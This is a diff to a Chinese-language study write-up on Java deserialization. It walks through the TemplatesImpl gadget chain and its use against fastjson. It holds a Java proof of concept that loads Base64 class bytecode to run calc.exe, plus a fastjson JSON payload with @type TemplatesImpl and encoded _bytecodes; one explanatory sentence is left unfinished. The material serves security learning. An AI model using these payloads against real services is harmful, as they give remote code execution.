@@ -354,7 +354,7 @@ parseObject second has done => class org.example.User
 
 ![image-20241226160542159](./images/image-20241226160542159.png)
 
-接下来继续遍历`clazz.getMethods()`，从中提取出非静态、没有参数、返回值类型满足下图条件的类的`getter`方法，然后同样地将其对应的属性生成`FieldInfo`（前面没有获取到）添加到`fieldList`中，注意其getOnly由于`getter`方法没有参数，将会设置为false
+接下来继续遍历`clazz.getMethods()`，从中提取出非静态、没有参数、返回值类型满足下图条件的类的`getter`方法，然后同样地将其对应的属性生成`FieldInfo`（前面没有获取到）添加到`fieldList`中，注意其getOnly由于`getter`方法没有参数，将会设置为`true`
 
 ![image-20241226161104059](./images/image-20241226161104059.png)
 
@@ -487,8 +487,11 @@ public class HelloTemplatesImpl {
     public static void main(String[] args) throws TransformerConfigurationException {
         byte[] code = Base64.getDecoder().decode("yv66vgAAADQANwoADAAbCQAcAB0IAB4KAB8AIAoAIQAiCAAjCgAhACQHACUHACYKAAkAJwcAKAcAKQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAApFeGNlcHRpb25zBwAqAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACDxjbGluaXQ+AQANU3RhY2tNYXBUYWJsZQcAJQEAClNvdXJjZUZpbGUBABBDYWxjRXhhbXBsZS5qYXZhDAANAA4HACsMACwALQEADENhbGMgRXhhbXBsZQcALgwALwAwBwAxDAAyADMBAAhjYWxjLmV4ZQwANAA1AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uDAANADYBAAtDYWxjRXhhbXBsZQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWACEACwAMAAAAAAAEAAEADQAOAAEADwAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABABAAAAAOAAMAAAARAAQAEgAMABMAAQARABIAAgAPAAAAGQAAAAMAAAABsQAAAAEAEAAAAAYAAQAAABgAEwAAAAQAAQAUAAEAEQAVAAIADwAAABkAAAAEAAAAAbEAAAABABAAAAAGAAEAAAAdABMAAAAEAAEAFAAIABYADgABAA8AAABUAAMAAQAAABe4AAUSBrYAB0unAA1LuwAJWSq3AAq/sQABAAAACQAMAAgAAgAQAAAAFgAFAAAADAAJAA8ADAANAA0ADgAWABAAFwAAAAcAAkwHABgJAAEAGQAAAAIAGg==");
         TemplatesImpl obj = new TemplatesImpl();
+        // _bytecodes为要加载的字节数组（二维数组）
         setFieldValue(obj, "_bytecodes", new byte[][] {code});
+        // _name为String类型且必须有值，不需要是类名
         setFieldValue(obj, "_name", "CalcExample");
+        // _tfactory类型为TransformerFactoryImpl，且必须有getExternalExtensionsMap方法
         setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
         obj.newTransformer();
     }
@@ -539,7 +542,7 @@ public class CalcExample extends AbstractTranslet {
 
 **利用链流程梳理**
 
-注意TemplatesImpl#defineTransletClasses()和Constructor#newInstance()均在TemplatesImpl#getTransletInstance()中被调用
+大致的利用链如下，注意TemplatesImpl#defineTransletClasses()和Constructor#newInstance()均在TemplatesImpl#getTransletInstance()中被调用。这里的调用链是很简单的，但是我们需要搞清楚为什么需要设置`_bytecodes` `_name` `_tfactory`这三个属性
 
 ```txt
 TemplatesImpl#newTransformer()->
@@ -550,6 +553,16 @@ TemplatesImpl#newTransformer()->
 		Constructor#newInstance()
 ```
 
+`_bytecodes` 设置的原因在方法`TemplatesImpl#defineTransletClasses()`中，该方法遍历并加载二维数组`_bytecodes`
+
+![image-20250106202714590](./images/image-20250106202714590.png)
+
+`_name`设置的原因在于`TemplatesImpl#getTransletInstance()`该函数调用`defineTransletClasses()`之前，会有一个对于`_name`是否为空的判断
+
+![image-20250106202926555](./images/image-20250106202926555.png)
+
+`_tfactory`设置的原因在于
+
 #### JdbcRowSetImpl
 
 ### 漏洞历史
@@ -558,9 +571,23 @@ TemplatesImpl#newTransformer()->
 
 ##### TemplatesImpl利用链
 
-**利用前提**：
+**利用前提**：fastjson显示设置`Feature.SupportNonPublicField`
 
-注意到了Templateslmpl#getOutputProperties()中调用了newTransformer()，这就和之前TemplateImpl的利用链连接起来了，那我们来看看
+**Payload**
+
+```json
+{ 
+    "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
+    "_bytecodes": [ "yv66vgAAADQAJgoAAwAPBwAhBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAARBYUFhAQAMSW5uZXJDbGFzc2VzAQAdTGNvbS9sb25nb2ZvL3Rlc3QvVGVzdDMkQWFBYTsBAApTb3VyY2VGaWxlAQAKVGVzdDMuamF2YQwABAAFBwATAQAbY29tL2xvbmdvZm8vdGVzdC9UZXN0MyRBYUFhAQAQamF2YS9sYW5nL09iamVjdAEAFmNvbS9sb25nb2ZvL3Rlc3QvVGVzdDMBAAg8Y2xpbml0PgEAEWphdmEvbGFuZy9SdW50aW1lBwAVAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwAFwAYCgAWABkBAARjYWxjCAAbAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAHQAeCgAWAB8BABNBYUFhNzQ3MTA3MjUwMjU3NTQyAQAVTEFhQWE3NDcxMDcyNTAyNTc1NDI7AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAIwoAJAAPACEAAgAkAAAAAAACAAEABAAFAAEABgAAAC8AAQABAAAABSq3ACWxAAAAAgAHAAAABgABAAAAHAAIAAAADAABAAAABQAJACIAAAAIABQABQABAAYAAAAWAAIAAAAAAAq4ABoSHLYAIFexAAAAAAACAA0AAAACAA4ACwAAAAoAAQACABAACgAJ"],
+    "_name": "aaa",
+    "_tfactory": {},
+    "_outputProperties": {}
+  }
+```
+
+fastjson的反序列化过程和java原生反序列化过程是不一样的，为什么`TemplatesImpl`链在这里还能发挥作用呢，根据之前对于改链的分析，我们了解到了该利用链触发的前提需要设置一些属性，fastjson是如何做到的，另外fastjson又是如何触发利用链的。
+
+注意到了Templateslmpl#getOutputProperties()中调用了newTransformer()，这就和之前TemplateImpl的利用链连接起来了，那我们来看看`getOutputProperties()`是如何被调用的
 
 **payload**
 
